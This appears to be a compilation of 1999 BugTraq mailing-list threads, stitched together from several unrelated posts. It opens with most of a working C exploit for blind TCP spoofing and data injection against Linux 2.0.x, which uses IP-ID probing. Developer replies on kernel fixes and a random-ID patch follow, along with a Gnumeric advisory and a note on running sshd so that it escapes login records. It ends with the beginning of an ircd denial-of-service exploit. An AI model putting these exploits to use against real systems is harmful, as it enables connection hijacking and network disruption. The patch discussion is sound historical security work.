+int sock, icmp_sock;
+int packid;
+unsigned int target, target_port, spoofed, spoofed_port;
+unsigned long myaddr;
+int
+get_id ()
+{
+  char buf[200];
+  char buf2[200];
+  int n;
+  unsigned long addr;
+  build_icmp_echo (ICMP_ECHO, 0, getpid (), 1, 0, 0, buf + IP_H);
+  build_ip (ICMP_ECHO_H, 0, packid++, 0, 64, IPPROTO_ICMP, myaddr,
+            target, 0, 0, buf);
+  do_checksum (buf, IPPROTO_ICMP, ICMP_ECHO_H);
+  write_ip (sock, buf, IP_H + ICMP_ECHO_H);
+  do
+    {
+      n = read (icmp_sock, buf2, 200);
+      addr = ((struct iphdr *) buf2)->saddr;
+    }
+  while (addr != target);
+  return ntohs (((struct iphdr *) buf2)->id);
+}
+
+  static int first_try;
+
+
+int
+is_bigger ()
+{
+  static unsigned short id = 0, tmp;
+  usleep (10000);
+  tmp = get_id ();
+  if (tmp == id + 1)
+    {
+      id = tmp;
+      return 0;
+    }
+  else if (tmp == id + 2)
+    {
+      id = tmp;
+      return 1;
+    }
+  else
+    {
+      if (first_try)
+        {
+          id = tmp;
+          first_try = 0;
+          return 0;
+        }
+      fprintf (stderr, "Unexpected IP id, diff=%i\n", tmp - id);
+      exit (1);
+    }
+}
+
+void
+probe (unsigned int ack)
+{
+  char buf[200];
+  usleep (10000);
+  build_tcp (spoofed_port, target_port, 2, ack, 16, 32000, 0, 0, 0, buf + IP_H);
+  build_ip (TCP_H, 0, packid++, 0, 64, IPPROTO_TCP, spoofed,
+            target, 0, 0, buf);
+  do_checksum (buf, IPPROTO_TCP, TCP_H);
+  write_ip (sock, buf, IP_H + TCP_H);
+}
+
+void
+send_data (unsigned int ack, char *rant)
+{
+  char * buf=alloca(200+strlen(rant));
+  build_tcp (spoofed_port, target_port, 2, ack, 16, 32000, 0, rant, strlen
+(rant), buf + IP_H);
+  build_ip (TCP_H + strlen (rant), 0, packid++, 0, 64, IPPROTO_TCP, spoofed,
+            target, 0, 0, buf);
+  do_checksum (buf, IPPROTO_TCP, TCP_H + strlen (rant));
+  write_ip (sock, buf, IP_H + TCP_H + strlen (rant));
+}
+
+void
+send_syn ()
+{
+  char buf[200];
+  build_tcp (spoofed_port, target_port, 1, 0, 2, 32000, 0, 0, 0, buf + IP_H);
+  build_ip (TCP_H, 0, packid++, 0, 64, IPPROTO_TCP, spoofed,
+            target, 0, 0, buf);
+  do_checksum (buf, IPPROTO_TCP, TCP_H);
+  write_ip (sock, buf, IP_H + TCP_H);
+}
+
+#define MESSAGE "Check out netstat on this host :)\n"
+
+
+void
+send_reset ()
+{
+  char buf[200];
+  build_tcp (spoofed_port, target_port, 4 + strlen (MESSAGE), 0, 4, 32000, 0, 0,
+0, buf + IP_H);
+  build_ip (TCP_H, 0, packid++, 0, 64, IPPROTO_TCP, spoofed,
+            target, 0, 0, buf);
+  do_checksum (buf, IPPROTO_TCP, TCP_H);
+  write_ip (sock, buf, IP_H + TCP_H);
+}
+
+
+#define LOTS ((unsigned int)(1<<30))
+main (int argc, char **argv)
+{
+  unsigned int seq_low = 0, seq_high = 0, seq_toohigh, seq_curr;
+  int i;
+  char myhost[100];
+  struct hostent *ht;
+  if (argc != 5)
+    {
+      printf ("usage:%s target_ip target_port spoofed_ip spofed_port\n",
+argv[0]);
+      exit (1);
+    }
+  gethostname (myhost, 100);
+  ht = gethostbyname (myhost);
+  if (!ht)
+    {
+      printf ("Your system is screwed.\n");
+      exit (1);
+    }
+  myaddr = *(unsigned long *) (ht->h_addr);
+  target = inet_addr (argv[1]);
+  target_port = atoi (argv[2]);
+  spoofed = inet_addr (argv[3]);
+  spoofed_port = atoi (argv[4]);
+  sock = open_raw_sock (IPPROTO_RAW);
+  icmp_sock = socket (AF_INET, SOCK_RAW, IPPROTO_ICMP);
+  if (sock <= 0 || icmp_sock <= 0)
+    {
+      perror ("raw sockets");
+      exit (1);
+    }
+  packid = getpid () * 256;
+  fprintf(stderr,"Checking for IP id increments\n");
+first_try=1;
+  for (i = 0; i < 5; i++)
+  {
+    is_bigger ();
+    sleep(1);
+    fprintf(stderr,"#");
+  }
+  send_syn ();
+  fprintf (stderr, "\nSyn sent, waiting 33 sec to get rid of resent
+SYN+ACK...");
+  for (i = 0; i < 33; i++)
+    {
+      fprintf (stderr, "#");
+      sleep (1);
+    }
+  fprintf (stderr, "\nack_seq accuracy:");
+first_try=1;
+  is_bigger();
+  probe (LOTS);
+  if (is_bigger ())
+    seq_high = LOTS;
+  else
+    seq_low = LOTS;
+  probe (2 * LOTS);
+  if (is_bigger ())
+    seq_high = 2 * LOTS;
+  else
+    seq_low = 2 * LOTS;
+  probe (3 * LOTS);
+  if (is_bigger ())
+    seq_high = 3 * LOTS;
+  else
+    seq_low = 3 * LOTS;
+  seq_toohigh = seq_high;
+  if (seq_high == 0 || seq_low == 0)
+    {
+      fprintf (stderr, "Non-listening port or not 2.0.x machine\n");
+      send_reset ();
+      exit (0);
+    }
+
+  do
+    {
+      fprintf (stderr, "%i ", (unsigned int) (seq_high - seq_low));
+      if (seq_high > seq_low)
+        seq_curr = seq_high / 2 + seq_low / 2 + (seq_high % 2 + seq_low % 2) / 2;
+      else
+        seq_curr = seq_low + (unsigned int) (1 << 31) - (seq_low - seq_high) / 2;
+      probe (seq_curr);
+      if (is_bigger ())
+        seq_high = seq_curr;
+      else
+        seq_low = seq_curr;
+      probe (seq_toohigh);
+      if (!is_bigger ())
+        break;
+//      getchar();
+    }
+  while ((unsigned int) (seq_high - seq_low) > 1);
+  fprintf (stderr, "\nack_seq=%u, sending data...\n", seq_curr);
+  send_data (seq_curr, MESSAGE);
+  fprintf (stderr, "Press any key to send reset.\n");
+  getchar ();
+  send_reset ();
+
+}
+
+-réponse :
+
+Hello,
+
+> I notified kernel mantainers in May, but they didn't seem interested.
+
+Perhaps everyone cares about 2.2 and 2.3 only these days.
+
+>       So, when an attacker sends (as a third packet of tcp handshake) a
+> packet with too small ack_seq, the server sends no packets (doesn't it
+> violate RFC793 ?). When a packet with too big ack_seq is sent, the server
+> sends a packet (with a reset flag).
+
+I've first heard of this behavior from Coder's IP-spoof.2.  He didn't
+realize this was a bug until I told him, though.
+
+My secure-linux patch for 2.0.33 included a fix for this (and a few
+other bugfixes, all enabled with its CONFIG_SECURE_BUGFIX option):
+
++#ifdef CONFIG_SECURE_BUGFIX
++       return 0;
++#else
+        return 1;
++#endif
+
+That's the last "return" in tcp_ack(), in linux/net/ipv4/tcp_input.c.
+A zero return from tcp_ack() means a failed handshake, and generates
+an RST packet.  Then 2.0.34 came out, and some of my bugfixes got in,
+including this one.  From patch-2.0.34.gz:
+
+-       return 1;
++       return 0;
+
+So, the version of my patch for 2.0.34 didn't need to fix this any
+more.  Of course, future updates of the patch I was making based on
+the latest one, and never bothered to check for this bug again.
+
+Now, after your post, I am looking at patch-2.0.35.gz:
+
+-       return 0;
++       return 1;
+
+So, the "feature" got re-introduced in 2.0.35.  I don't know of the
+reason for this.  I can only guess that the other major TCP changes
+in 2.0.35 were originally based on a version of the code older than
+the one in 2.0.34, but only got into 2.0.35.  The other guess is, of
+course, that this change caused problems in 2.0.34, but I doubt it.
+
+>       Now let's recall another Linux feature. Many OSes (including Linux)
+> assign to ID field of an outgoing IP datagram consecutive, increasing
+> numbers (we forget about fragmentation here; irrelevant in this case). That
+
+Somehow I didn't think of this at the time (was before this ID stuff
+got to BugTraq), so I tried playing with packet count obtained from
+the router via SNMP.  Never got my exploit reliable enough, though.
+
+>       At the end of this post I enclosed an exploit; don't use it without
+> the permission of the target host's admin. I tested it on 2.0.37, 36 and 30;
+> probably all 2.0.x are affected. It requires libnet (which can be downloaded
+
+Except for 2.0.34 and 2.0.33 with my patch, I believe.  I would
+appreciate it if you could test the exploit on any of those, so that
+I could put the fix back into my patch for 2.0.37.
+
+Signed,
+Solar Designer
+
+-Réponse :
+
+
+
+
+> So, the version of my patch for 2.0.34 didn't need to fix this any
+> more.  Of course, future updates of the patch I was making based on
+> the latest one, and never bothered to check for this bug again.
+>
+> Now, after your post, I am looking at patch-2.0.35.gz:
+>
+> -     return 0;
+> +     return 1;
+>
+> So, the "feature" got re-introduced in 2.0.35.  I don't know of the
+> reason for this.  I can only guess that the other major TCP changes
+
+It was put back into 2.0.35 because the "fix" caused interoperability
+problems with many other stacks.
+
+Alan
+
+-réponse :
+
+On Sun, Aug 01, 1999 at 01:10:06AM +0200, Nergal wrote:
+>       Now let's recall another Linux feature. Many OSes (including Linux)
+> assign to ID field of an outgoing IP datagram consecutive, increasing
+> numbers (we forget about fragmentation here; irrelevant in this case). That
+> enables anyone to determine the number of packets sent by host A: it's enough
+> to ping it, note the value of ID field of received ICMP_REPLY packet, wait x
+> seconds (or perform some other actions), then again ping host A. The
+> difference between ID fields of received ICMP_REPLY packets is equal to (the
+> number of packets sent by A in x second) +1. "Idle portscan" by antirez uses
+> this technique.
+
+Re,
+
+        i think that a consecutive IP id now can be considered
+        a weakness in IP stacks. Using it you today are able
+        at least to scan spoofed, to guess host traffic and
+        you can use it when you need to know if the target host
+        of your spoofed packet answered. Here is a patch for
+        linux 2.0.36, maybe it isn't SMP safe so don't use it
+        if your linux box have more than one CPU. Note: the name
+        of this patch are 'True random id', however this isn't
+        true, a better name is 'Truly random id'. There are
+        a lot of 'better possible patchs' to fix this problem, but
+        this patch is old and writed in 30 min. so i'm interested
+        in your comment about how to implement a better patch.
+
+bye,
+antirez
+
+--
+Salvatore Sanfilippo      antirez@speedcom.it     antirez@alicomitalia.it
+ALICOM snc  Tel: +39-0871-403522  Fax: +39-0871-41960 Web: www.alicom.com
+                 try hping: http://www.kyuzz.org/antirez
+FreeSilviaBaraldiniFreeSilviaBaraldiniFreeSilviaBaraldiniFreeSilviaBarald
+
+
+-Réponse de la réponse :
+> On Sun, Aug 01, 1999 at 01:10:06AM +0200, Nergal wrote:
+> >     Now let's recall another Linux feature. Many OSes (including Linux)
+> > assign to ID field of an outgoing IP datagram consecutive, increasing
+> > numbers (we forget about fragmentation here; irrelevant in this case). That
+> > enables anyone to determine the number of packets sent by host A: it's
+enough
+> > to ping it, note the value of ID field of received ICMP_REPLY packet, wait x
+> > seconds (or perform some other actions), then again ping host A. The
+> > difference between ID fields of received ICMP_REPLY packets is equal to (the
+> > number of packets sent by A in x second) +1. "Idle portscan" by antirez uses
+> > this technique.
+>
+> Re,
+>
+>       i think that a consecutive IP id now can be considered
+>       a weakness in IP stacks. Using it you today are able
+>       at least to scan spoofed, to guess host traffic and
+>       you can use it when you need to know if the target host
+>       of your spoofed packet answered. Here is a patch for
+>       linux 2.0.36, maybe it isn't SMP safe so don't use it
+>       if your linux box have more than one CPU. Note: the name
+>       of this patch are 'True random id', however this isn't
+>       true, a better name is 'Truly random id'. There are
+>       a lot of 'better possible patchs' to fix this problem, but
+>       this patch is old and writed in 30 min. so i'm interested
+>       in your comment about how to implement a better patch.
+
+Without having done an analysis of the pseudo-random number generator
+in the Linux patch provided, I have a few comments to make.
+
+This situation is very similar to the resolver problem.  For a
+reminder about the resolver issue we were solving, see
+
+        http://www.openbsd.org/advisories/res_random
+
+Wow.  April 22, 1997.  That's before OpenBSD 2.1 was released, you
+know, the release that was almost impossible to install from CD...
+
+OpenBSD 2.5 solves this by using the same non-repeating random number
+generator that we used to solve the resolver problem.  The same code
+simply gets moved into the kernel.
+
+Basically, you do not want to make that field random using a stock
+random number generator, as close repeats (same number repeated in
+close proximity to a previous occurance) can cause grotesque errors in
+fragment reassembly at the destination.  The existing method of using
+ip_id++, avoids such problems .... as well as they can be avoided in a
+16-bit identifier space.  If you don't believe me, heck, just set the
+ip_id to 31337 each time and see how well IP de-fragmentation suddenly
+works..
+
+Hence, what you really want is a pseudo random number generator which
+is fairly strong (in a 16 bit space, hah), but cleverly avoids
+re-using the same number in close proximity... I believe that this
+would solve your problem best.
+
+For more details, see:
+
+        http://www.openbsd.org/cgi-bin/cvsweb/src/sys/netinet/ip_id.c?rev=1.1
+
+In our case, this is called in the following places...
+
+netinet/ip_ip4.c:    ipo->ip_id = ip_randomid();
+netinet/ip_mroute.c:    ip_copy->ip_id = ip_randomid();
+netinet/ip_output.c:            ip->ip_id = ip_randomid();
+netinet/raw_ip.c:                       ip->ip_id = ip_randomid();
+netinet6/ipv6_trans.c:  ip->ip_id = ip_randomid();
+
+Enjoy.
+
+-Réponse :
+>
+> It was put back into 2.0.35 because the "fix" caused interoperability
+> problems with many other stacks.
+
+I've discussed those interoperability problems with Alan (thanks!),
+and have now updated my 2.0.37 patch to include a fix that shouldn't
+cause them any more:
+
+        http://www.false.com/security/linux/
+
+I must also thank Nergal for testing the patch.
+
+Signed,
+Solar Designer
+
+-Réponse :
+
+In article <19990806123911.A1147@speedcom.it>,
+Salvatore Sanfilippo -antirez-  <antirez@speedcom.it> wrote:
+>       i think that a consecutive IP id now can be considered
+>       a weakness in IP stacks. [...] Here is a patch for
+>       linux 2.0.36 [...] 'Truly random id' [...]
+
+Your patch isn't secure.  It uses a weak pseudo-random number
+generator to generate id's, and an attacker can just crack the
+PRNG to predict what id's will be used in the future.
+
+I think you probably want to use /dev/urandom to generate your
+IP id's, to prevent this attack.  (Or use a variant of Bellovin's
+RFC 1948, adapted to generate IP id's instead of TCP ISN's.)
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+---Gnumeric potential security hole.:
+
+The Gnumeric spreadsheet contains a number of "plugins".  Some of
+these plugins allow users to define functions in Perl, Python and
+Guile and export those to the Gnumeric engine.
+
+The Guile plugin was exporting a dangerous function that allowed any
+user to execute arbitrary scheme code.  Which means that a gnumeric
+spredsheet file might have contained malicious code and it would have
+been executed when Gnumeric evaluates the contents of the cell.
+
+To fix this you can either:
+
+   1. Upgrade your Gnumeric to a new version of it.
+   2. You can remove the libgnumguile plugin from the system.
+
+best wishes,
+Miguel
+
+diff -cr linux-2.0.36/Documentation/Configure.help linux-2.0.36-hack/Documentation/Configure.help
+*** linux-2.0.36/Documentation/Configure.help   Sun Nov 15 19:32:42 1998
+--- linux-2.0.36-hack/Documentation/Configure.help      Sun Dec 27 15:48:18 1998
+***************
+*** 1336,1341 ****
+--- 1336,1349 ----
+    hence it is recommended that you say Y here unless you really know
+    what you're doing.
+
++ IP: True random id
++ CONFIG_ID_RAND
++   This supplies true random ip id field in order to prevent id abuse
++   in port scanning and in outgoing packets traffic guessing.
++   See http://www.geek-girl.com/bugtraq/1998_4/0609.html for more
++   informations on this topic.
++   Warning: 256 Kbytes needed.
++
+  IP: Allow large windows (not recommend if <16MB of memory)
+  CONFIG_SKB_LARGE
+    On high speed, long distance networks the performance limit on
+diff -cr linux-2.0.36/net/ipv4/Config.in linux-2.0.36-hack/net/ipv4/Config.in
+*** linux-2.0.36/net/ipv4/Config.in     Thu Jun  4 00:17:50 1998
+--- linux-2.0.36-hack/net/ipv4/Config.in        Sun Dec 27 15:01:53 1998
+***************
+*** 47,50 ****
+--- 47,51 ----
+  bool 'IP: Disable Path MTU Discovery (normally enabled)' CONFIG_NO_PATH_MTU_DISCOVERY
+  #bool 'IP: Disable NAGLE algorithm (normally enabled)' CONFIG_TCP_NAGLE_OFF
+  bool 'IP: Drop source routed frames' CONFIG_IP_NOSR
++ bool 'IP: True random id' CONFIG_ID_RAND
+  bool 'IP: Allow large windows (not recommended if <16Mb of memory)' CONFIG_SKB_LARGE
+diff -cr linux-2.0.36/net/ipv4/ip_forward.c linux-2.0.36-hack/net/ipv4/ip_forward.c
+*** linux-2.0.36/net/ipv4/ip_forward.c  Thu Jun  4 00:17:50 1998
+--- linux-2.0.36-hack/net/ipv4/ip_forward.c     Sat Dec 26 21:47:15 1998
+***************
+*** 77,83 ****
+--- 77,87 ----
+        iph->protocol   =       IPPROTO_IPIP;
+        iph->ihl        =       5;
+        iph->tot_len    =       htons(skb->len + len);  /* Anand, ernet */
++ #ifdef CONFIG_ID_RAND
++       iph->id         =       htons(getrandid());
++ #else
+        iph->id         =       htons(ip_id_count++);
++ #endif
+        ip_send_check(iph);
+
+        skb->dev = out;
+diff -cr linux-2.0.36/net/ipv4/ip_output.c linux-2.0.36-hack/net/ipv4/ip_output.c
+*** linux-2.0.36/net/ipv4/ip_output.c   Thu Jun  4 00:17:50 1998
+--- linux-2.0.36-hack/net/ipv4/ip_output.c      Sun Dec 27 15:44:05 1998
+***************
+*** 30,35 ****
+--- 30,36 ----
+   *            Juan Jose Ciarlante:    sk/skb source address rewriting
+   *    Elena Apolinario Fdez de Sousa,:ipmr_forward never received multicast
+   *    Juan-Mariano de Goyeneche       traffic generated locally.
++  *    Salvatore Sanfilippo    :       IP id random. <antirez@seclab.com>
+   */
+
+  #include <asm/segment.h>
+***************
+*** 265,271 ****
+--- 266,276 ----
+        return mac;
+  }
+
++ #ifdef CONFIG_ID_RAND
++ unsigned short getrandid(void);
++ #else
+  int ip_id_count = 0;
++ #endif
+
+  /*
+   * This routine builds the appropriate hardware/IP headers for
+***************
+*** 483,489 ****
+--- 488,498 ----
+                        add_to_send_queue(sk, skb);
+                        /* fall through */
+                case 1:
++ #ifdef CONFIG_ID_RAND
++                       iph->id = htons(getrandid());
++ #else
+                        iph->id = htons(ip_id_count++);
++ #endif
+        }
+
+        skb->free = free;
+***************
+*** 751,757 ****
+--- 760,770 ----
+                        iph->ihl=5;
+                        iph->tos=sk->ip_tos;
+                        iph->tot_len = htons(length);
++ #ifdef CONFIG_ID_RAND
++                       iph->id=htons(getrandid());
++ #else
+                        iph->id=htons(ip_id_count++);
++ #endif
+                        iph->frag_off = 0;
+                        iph->ttl=sk->ip_ttl;
+                        iph->protocol=type;
+***************
+*** 853,860 ****
+        /*
+         *      Get an identifier
+         */
+!
+        id = htons(ip_id_count++);
+
+        /*
+         *      Being outputting the bytes.
+--- 866,877 ----
+        /*
+         *      Get an identifier
+         */
+!
+! #ifdef CONFIG_ID_RAND
+!       id = htons(getrandid());
+! #else
+        id = htons(ip_id_count++);
++ #endif
+
+        /*
+         *      Being outputting the bytes.
+***************
+*** 1209,1211 ****
+--- 1226,1304 ----
+  #endif
+  }
+
++ #ifdef CONFIG_ID_RAND
++ unsigned int random(void)
++ {
++         static unsigned long seed=152L;
++         seed=seed*69069L+1;
++         return seed^jiffies;
++ }
++
++ #define BIT 16
++ #define M (1 << BIT)
++ #define N ((1 << BIT) - 1)
++ #define RANDOM (random() & N)
++
++ void swap(unsigned short *a, unsigned short *b)
++ {
++       unsigned short t;
++       t = *a;
++       *a = *b;
++       *b = t;
++ }
++
++ unsigned short getrandid(void)
++ {
++       static unsigned short vect1[M];
++       static unsigned short vect2[M];
++       static int status = 0;
++       static int c = 0;
++
++       if (status == 1)
++       {
++               if (c == N)
++                       status = 2;
++
++               swap(&vect2[c], &vect2[RANDOM]);
++               c++; c&=N;
++               return vect1[c];
++       }
++
++       if (status == 2)
++       {
++               if (c == N)
++                       status = 1;
++
++               swap(&vect1[c], &vect1[RANDOM]);
++               c++; c&=N;
++               return vect2[c];
++       }
++
++       if (status == 0)        /* initial shuffling */
++       {
++               register int j;
++
++               for (j = 0; j < M; j++)
++                       vect2[j] = vect1[j] = j;
++
++               for (j = 0; j < M; j++)
++                       swap(&vect1[j], &vect1[RANDOM]);
++
++               status = 1;
++               printk(KERN_INFO "IP id true rand: initial shuffling completed\n");
++       }
++
++       if (status == 1)
++       {
++               if (c == N)
++                       status = 2;
++
++               swap(&vect2[c], &vect2[RANDOM]);
++               c++; c&=N;
++               return vect1[c];
++       }
++
++       printk(KERN_WARNING "Warning, getrandid() status = %d\n", status);
++       return RANDOM;
++ }
++ #endif /* CONFIG_ID_RAND */
+diff -cr linux-2.0.36/net/ipv4/raw.c linux-2.0.36-hack/net/ipv4/raw.c
+*** linux-2.0.36/net/ipv4/raw.c Thu Jun  4 00:17:50 1998
+--- linux-2.0.36-hack/net/ipv4/raw.c    Sat Dec 26 21:56:37 1998
+***************
+*** 308,314 ****
+--- 308,318 ----
+                 *      ip_build_xmit clean (well less messy).
+                 */
+                if (!iph->id)
++ #ifdef CONFIG_ID_RAND
++                       iph->id = htons(getrandid());
++ #else
+                        iph->id = htons(ip_id_count++);
++ #endif
+                iph->check=ip_fast_csum((unsigned char *)iph, iph->ihl);
+        }
+  }
+diff -cr linux-2.0.36/net/ipv4/tcp_output.c linux-2.0.36-hack/net/ipv4/tcp_output.c
+*** linux-2.0.36/net/ipv4/tcp_output.c  Sun Nov 15 19:33:22 1998
+--- linux-2.0.36-hack/net/ipv4/tcp_output.c     Sat Dec 26 21:46:20 1998
+***************
+*** 523,529 ****
+--- 523,534 ----
+                                            skb->localroute, sk->bound_device);
+                }
+
++ #ifdef CONFIG_ID_RAND
++               iph->id = htons(getrandid());
++ #else
+                iph->id = htons(ip_id_count++);
++ #endif
++
+  #ifndef CONFIG_NO_PATH_MTU_DISCOVERY
+                if (rt && ntohs(iph->tot_len) > rt->rt_mtu)
+                        iph->frag_off &= ~htons(IP_DF);
+diff -cr linux-2.0.36/net/netsyms.c linux-2.0.36-hack/net/netsyms.c
+*** linux-2.0.36/net/netsyms.c  Mon Jul 13 22:47:41 1998
+--- linux-2.0.36-hack/net/netsyms.c     Sat Dec 26 21:53:33 1998
+***************
+*** 107,113 ****
+--- 107,115 ----
+        X(ip_rt_put),
+        X(arp_send),
+        X(arp_bind_cache),
++ #ifndef CONFIG_ID_RAND
+        X(ip_id_count),
++ #endif
+        X(ip_send_check),
+        X(ip_forward),
+        X(sysctl_ip_forward),
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+---Paranoid? Running SSHD as normal users. :
+
+This could be good.. But this could be bad. Running on a system with out
+the shadow password suite, then this would work very easily,
+running on a machine with a shadow password suite, it would atleast
+require the shadow file to be group writeable to the GID you run
+the program as. Which in most cases, shadow passwords are never readable
+to a regular users group, otherwise what is the point of the shadow suite?
+
+I personally am using this to my advantage, and wouldn't call it a bug,
+but figured I would let you all, who may not have thought about this know.
+
+If a non-priv'd user were to download the ssh source to their directory,
+compile it with something like:
+
+./configure --prefix=PREFIX=/home/user/ssh --sysconfdir=/home/user/ssh/etc/
+
+That will configure ssh to put the bins and sbins in ~/ssh, and to put all
+files that would be in /etc/  into /home/user/ssh/etc/
+
+You can then run make and make install, which will generate your
+ssh_host_key and all related files.
+
+The user would then need to edit the sshd_config, and change the port to
+> 1024 (i chose 2222), make sure its "use login no", unless login is
+suid.. If login is suid, (i don't see why it would be, and it shouldn't
+be), then /etc/shadow wouldn't need to be readable. And then change the
+runpid to a writable directory to the user "~/ssh/var/".
+
+I chose to do RSA authentication, so I used ssh-keygen to create a key
+on the box side, and then put my identity.pub from my client, into
+~/.ssh/authorized_keys, run your newly compiled sshd ~/ssh-1.2.27/sshd,
+and it should read the correct config files, and launch ssh as 'user' on
+port 2222.
+
+You can then ssh to it, with just your RSA password (if you used a
+password).
+
+The good: If SSH had a remote BO, the only thing compromised is anything
+           in the group that /etc/shadow was r+w by.
+
+The Bad: The user is not put into wtmp/utmp files.. and if they defined
+         their own sys files, or modified it in the ssh source, to not do
+         syslogging, then you wouldn't see any information about it in
+         syslog either. Which of course would make tracking users a little
+         harder, unless you have something that records processes, which
+         is usually pretty processor intensive. Without the marks of the
+         utmp/wtmp you will of course not see them in a 'w' or a 'who',
+         and you will not gain control of your tty either:
+
+
+<logging in with RSA>
+
+/dev/ttyp2: Operation not permitted
+[server]-[user] ~*
+
+user  15859  0.1  0.4  2184   784  p2 S    16:21   0:00 -bash
+crw-rw-rw-   1 root     root       3,   2 Aug  4 16:21 /dev/ttyp2
+
+You will also note the following error in log going along with the above
+problems with allocating a tty:
+
+Aug  4 16:21:42 server sshd[15857]: debug: Allocating pty.
+Aug  4 16:21:42 server sshd[15857]: debug: Ignoring unsupported tty mode opcode
+11 (0xb)
+Aug  4 16:21:42 server sshd[15857]: debug: Forking shell.
+Aug  4 16:21:42 server sshd[15857]: debug: Entering interactive session.
+
+
+If a user tries to do this without /etc/shadow being readable to them, or
+their group, you will notice in your debug log:
+
+Aug  4 16:21:29 server sshd[15855]: debug: Can't find user's shadow - access
+denied.
+
+(unless of course, they made it so it doesn't log to syslog)
+
+
+
+Sorry for the length, just thought I'd pass it on, for those who hadn't
+already thought of this.
+
+
+Erik Parker
+eparker@mindsec.com
+
+
+-Réponse :
+
+
+
+pc@cyclotron.bombshelter.net  pointed out to me:
+
+> This could be good.. But this could be bad. Running on a system with out
+> the shadow password suite, then this would work very easily,
+> running on a machine with a shadow password suite, it would atleast
+> require the shadow file to be group writeable to the GID you run
+> the program as. Which in most cases, shadow passwords are never readable
+> to a regular users group, otherwise what is the point of the shadow suite?
+
+
+require the shadow file to be group READABLE.. Which again, it never
+should be group readable to average users. However a lot of machines have
+a group readable program, for programs like xlock, and other ones that
+don't need to run as root, but do need to read that file.
+
+> The good: If SSH had a remote BO, the only thing compromised is anything
+>          in the group that /etc/shadow was r+w by.
+
+
+And another mistake, obviously, if the shadow file is r+w to the person
+who compromised it, they own the entire box. I don't know how I overlooked
+that statement. I meant g+r, so its group readable..
+
+And as Alan cox pointed out..
+
+It might mean more trouble for the user logged in that way, if it was
+being used in a legitimate way.. Because whoever owned the tty they are
+sitting on, could easily write to their term.
+
+Erik Parker
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+---IRC: Exploit for a Bug in ircd2.10.x (qident) :
+
+I dont think that has been posted before.
+There is a bug in ircd 2.10.x used in ircnet in conjunction with
+qident.
+
+DESCRIPTION
+-----------
+
+qident does not check sucessfully for spaces and characters
+as like *, ! and @.
+
+When using an ident as like "@o ! ! !", o would be treated as
+host, the parameters which are left, would be enhanced by the number of
+spaces provided by the ident.
+
+If this ident is accepted, the connected client will become
+a ghost. This ghost is not successfully transmitted to the
+ircnetwork, thereful only visible on the server it connects.
+
+That would not be problematic, but the real problems occur, when
+the bogus idented client joins a channel. The join is not being
+rejected by the network and transfers the bogus ident with the
+parameters. Then, a "protocol error" occurs, the server is forced
+to split from the rest of the network.
+
+More problematic gets the fact, when the bogus client gets collided.
+This can lead to a denial of service crashing the ircd completely.
+
+FIXES
+-----
+
+The opers had been informed quite a time ago, there are only some servers
+left which react on that bogus ident.
+
+EXPLOIT
+-------
+
+Attached you will find a simple exploit, which starts an irc client
+with a spoofed ident. There should not run in.identd, while the
+exploit is used. Also, you have to be root (used for the bind). And it's
+written for linux.
+
+GREETINGS
+---------
+especially to suffkopp and his friend newroot. those lamers forced me to
+make it public.
+
+
+so far,
+
+psychoid
+
+www.psychoid.lam3rz.de
+
+--
+Sent through Global Message Exchange - http://www.gmx.net
+
+     Attachment: doomzday4.c (10k) -- Download without Scan -- Scan with McAfee
+
+
+/* DooMzDaY v4 - ircd 2.10.x/ircnet - exploit
+ * for linux - written by psychoid from tcl
+ *
+ * general vulnerability found by Hippo
+ * a fix already is available, but there are
+ * also incomplete fixes out there.
+ *
+ * this splits a server from the network. Simple, isnt it ?
+ *
+ * if you really want to run this, there should not run
+ * an in.identd on your machine. Also, you need to be root.
+ *
+ * erm, this is for educational purposes only. Even, if noone gets
+ * hurt *g*.
+ */ 
+
+#include <stdio.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <netdb.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <netinet/in.h>
+#include <netinet/ip.h>
+#include <netinet/ip_icmp.h>
+#include <arpa/inet.h>
+#include <setjmp.h>
+#include <signal.h>
+#include <string.h>
+#include <sys/time.h>
+
+jmp_buf jumpback;
+
+void timed_out( int sig ) {
+  longjmp( jumpback, 0x0 );
+}
+
+void fuck_it(int sig) {
+  longjmp( jumpback, 0x0 );
+}
+
+int settimeout(unsigned short sockh, unsigned short timeout) {
+  fd_set rfds;
+  struct timeval tv;
+  FD_ZERO(&rfds);
+  FD_SET(sockh,&rfds);
+  tv.tv_sec=timeout;
+  tv.tv_usec=0;
+  select(sockh+1,&rfds,NULL,NULL,&tv);
+  if (!FD_ISSET(sockh,&rfds)) {
+     return 0;
+  } else {
+     return 1;
+  }     
+  /* returns 0=timeout or error, 1=input there */
+}
+
+
+unsigned long lookup(char *hostname)
+{
+    struct hostent *name;
+    unsigned long int address;
+    
+    if ((address = inet_addr(hostname)) != -1)
+        return address;
+    if ((name=gethostbyname(hostname)) == NULL)
+        return -1;
+    memcpy(&address,name->h_addr,name->h_length);
+    return address;
+
+}
+
+int writesock(int sock,char *buf)
+{
+    write(sock,buf,strlen(buf));    
+}
+
+int readsock(int sock,char *buf,int size)
+{
+    int rc;
+    fd_set rfds;
+    struct timeval tv;
+    int cnt;
+    memset(buf,0x0,size);
+    cnt=0;
+    if (settimeout(sock,1)==1) {
+        do {
+            rc=read(sock,buf+cnt,1);            
+            if (rc==0) return rc;
+            if (rc==-1) return rc;
+            cnt++;
+        } while (buf[cnt-1] != '\n' && buf[cnt-1] != '\r' && cnt<size);
+    }
+    return 0;
+}
+
+int sockconnect( unsigned short timeout, unsigned long iP, unsigned short port ) {
+  int                socky;
+  int wasread;
+  int currentsock;
+  struct sockaddr_in address;
+  struct hostent *athost;
+  char lasock[0x100];
+  unsigned long tip;
+  unsigned short prt;
+  FILE *sockslist;
+  FILE *lastsock;
+  
+  if (( socky = socket( AF_INET, SOCK_STREAM, 0x0 )) == -1 ) {
+    return socky;
+  }
+    
+  address.sin_family      = AF_INET;
+ 
+  address.sin_port        = htons( port );
+  address.sin_addr.s_addr = iP; 
+  signal( SIGALRM, timed_out );
+  alarm(10);    
+
+  if ( setjmp( jumpback ) == 0x0 ) {
+    if ( connect( socky, (struct sockaddr*)(&address), sizeof( address ))) {
+       socky = -1;
+    }
+  } else { socky = -1; }
+
+  fflush(stdout);        
+
+  alarm (0);
+  return socky;
+
+}
+
+void brokenpipe()
+{
